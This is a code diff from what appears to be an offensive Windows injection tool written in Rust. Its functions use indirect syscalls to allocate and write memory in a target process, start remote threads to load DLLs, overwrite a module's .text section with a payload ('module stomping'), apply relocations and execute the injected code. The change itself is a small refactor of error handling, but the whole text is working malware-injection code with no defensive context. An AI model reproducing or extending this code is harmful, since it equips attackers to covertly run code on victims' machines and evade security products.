@@ -337,7 +337,7 @@ unsafe fn enumerate_remote_modules(
     let mut ldr_ptr: usize = 0;
 
     // Resolve NtReadVirtualMemory via indirect syscall
-    let target = crate::syscalls::get_syscall_id("NtReadVirtualMemory");
+    let target = crate::syscalls::get_syscall_id("NtReadVirtualMemory").ok();
 
     // Helper: read usize from target process
     let read_usize = |addr: usize| -> Result<usize> {
@@ -503,8 +503,8 @@ unsafe fn load_dll_remote(
     .ok_or_else(|| anyhow!("cannot resolve LoadLibraryA"))?;
 
     // Allocate memory for DLL path in target
-    let alloc_target = crate::syscalls::get_syscall_id("NtAllocateVirtualMemory");
-    let write_target = crate::syscalls::get_syscall_id("NtWriteVirtualMemory");
+    let alloc_target = crate::syscalls::get_syscall_id("NtAllocateVirtualMemory").ok();
+    let write_target = crate::syscalls::get_syscall_id("NtWriteVirtualMemory").ok();
 
     let alloc_tgt = alloc_target
         .as_ref()
@@ -550,7 +550,7 @@ unsafe fn load_dll_remote(
     }
 
     // Create remote thread to call LoadLibraryA(path)
-    let thread_target = crate::syscalls::get_syscall_id("NtCreateThreadEx");
+    let thread_target = crate::syscalls::get_syscall_id("NtCreateThreadEx").ok();
     let thread_tgt = thread_target
         .as_ref()
         .ok_or_else(|| anyhow!("NtCreateThreadEx SSN not available"))?;
@@ -578,7 +578,7 @@ unsafe fn load_dll_remote(
         // P2-23: NtCreateThreadEx failed — free the DLL path memory we
         // allocated above before returning the error.  Without this cleanup
         // the allocation would leak in the target process.
-        let free_target = crate::syscalls::get_syscall_id("NtFreeVirtualMemory");
+        let free_target = crate::syscalls::get_syscall_id("NtFreeVirtualMemory").ok();
         if let Some(ref free_tgt) = free_target {
             let mut free_size: usize = 0;
             let mem_release: u32 = 0x00008000; // MEM_RELEASE
@@ -597,7 +597,7 @@ unsafe fn load_dll_remote(
     }
 
     // Wait for the remote thread to complete (LoadLibraryA returns)
-    let wait_target = crate::syscalls::get_syscall_id("NtWaitForSingleObject");
+    let wait_target = crate::syscalls::get_syscall_id("NtWaitForSingleObject").ok();
     if let Some(ref wait_tgt) = wait_target {
         let _ = do_syscall(
             wait_tgt.ssn,
@@ -618,7 +618,7 @@ unsafe fn load_dll_remote(
     // P2-23 (success path): Free the DLL path memory allocated above.
     // This runs on the happy path; the NtCreateThreadEx failure branch
     // also frees the same allocation before returning the error.
-    let free_target = crate::syscalls::get_syscall_id("NtFreeVirtualMemory");
+    let free_target = crate::syscalls::get_syscall_id("NtFreeVirtualMemory").ok();
     if let Some(ref free_tgt) = free_target {
         let mut free_size: usize = 0;
         let mem_release: u32 = 0x00008000; // MEM_RELEASE
@@ -694,7 +694,7 @@ unsafe fn read_remote_memory<T>(
     address: usize,
     output: &mut T,
 ) -> Result<()> {
-    let read_target = crate::syscalls::get_syscall_id("NtReadVirtualMemory");
+    let read_target = crate::syscalls::get_syscall_id("NtReadVirtualMemory").ok();
     let read_tgt = read_target
         .as_ref()
         .ok_or_else(|| anyhow!("NtReadVirtualMemory SSN not available"))?;
@@ -755,7 +755,7 @@ unsafe fn stomp_text_section(
     }
 
     // Make .text section writable
-    let protect_target = crate::syscalls::get_syscall_id("NtProtectVirtualMemory");
+    let protect_target = crate::syscalls::get_syscall_id("NtProtectVirtualMemory").ok();
     let protect_tgt = protect_target
         .as_ref()
         .ok_or_else(|| anyhow!("NtProtectVirtualMemory SSN not available"))?;
@@ -779,7 +779,7 @@ unsafe fn stomp_text_section(
     }
 
     // Write payload
-    let write_target = crate::syscalls::get_syscall_id("NtWriteVirtualMemory");
+    let write_target = crate::syscalls::get_syscall_id("NtWriteVirtualMemory").ok();
     let write_tgt = write_target
         .as_ref()
         .ok_or_else(|| anyhow!("NtWriteVirtualMemory SSN not available"))?;
@@ -807,7 +807,7 @@ unsafe fn stomp_text_section(
     // certain virtualized environments with split TLBs, stale cached
     // instructions may be executed without this flush.  Non-fatal: log
     // and continue regardless of return value.
-    if let Some(flush_tgt) = crate::syscalls::get_syscall_id("NtFlushInstructionCache") {
+    if let Ok(flush_tgt) = crate::syscalls::get_syscall_id("NtFlushInstructionCache") {
         let flush_status = do_syscall(
             flush_tgt.ssn,
             flush_tgt.gadget_addr,
@@ -900,7 +900,7 @@ unsafe fn fix_relocations(
 
     // We need to apply relocations via NtWriteVirtualMemory to the target.
     // Each relocation is a 4-byte or 8-byte fixup at a specific RVA.
-    let write_target = crate::syscalls::get_syscall_id("NtWriteVirtualMemory");
+    let write_target = crate::syscalls::get_syscall_id("NtWriteVirtualMemory").ok();
     let write_tgt = write_target
         .as_ref()
         .ok_or_else(|| anyhow!("NtWriteVirtualMemory SSN not available"))?;
@@ -995,7 +995,7 @@ unsafe fn execute_payload(
     process_handle: *mut c_void,
     entry_address: usize,
 ) -> Result<usize> {
-    let thread_target = crate::syscalls::get_syscall_id("NtCreateThreadEx");
+    let thread_target = crate::syscalls::get_syscall_id("NtCreateThreadEx").ok();
     let thread_tgt = thread_target
         .as_ref()
         .ok_or_else(|| anyhow!("NtCreateThreadEx SSN not available"))?;
